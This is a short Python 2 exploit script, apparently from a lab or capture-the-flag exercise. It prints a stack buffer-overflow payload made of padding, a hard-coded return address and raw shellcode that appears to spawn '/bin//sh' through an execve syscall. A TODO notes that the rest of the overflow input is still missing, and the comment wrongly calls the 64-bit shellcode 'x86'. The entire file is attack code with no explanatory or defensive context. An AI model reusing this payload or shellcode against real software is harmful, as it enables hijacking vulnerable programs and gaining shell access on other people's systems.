#!/usr/bin/env python2


# x86 shellcode
addr='\xb0\x56\xff\xff\xff\x7f\x00\x00'
prepend='\x00\x00\x00\x00\x00'
shellcode='\x48\x83\xEC\x20\x48\x89\xE5\x6A' \
          '\x3B\x58\x48\x31\xFF\x57\x48\xBF' \
          '\x2F\x62\x69\x6E\x2F\x2F\x73\x68' \
          '\x57\x48\x89\xE7\x48\x31\xF6\x56' \
          '\x57\x48\x89\xE6\x48\x31\xD2\x0F\x05';

# TODO actually generate the other parts of the input necessary to
# execute the buffer overflow, combine it with the shellcode, and print it all out
print prepend+prepend+prepend+prepend+addr+shellcode
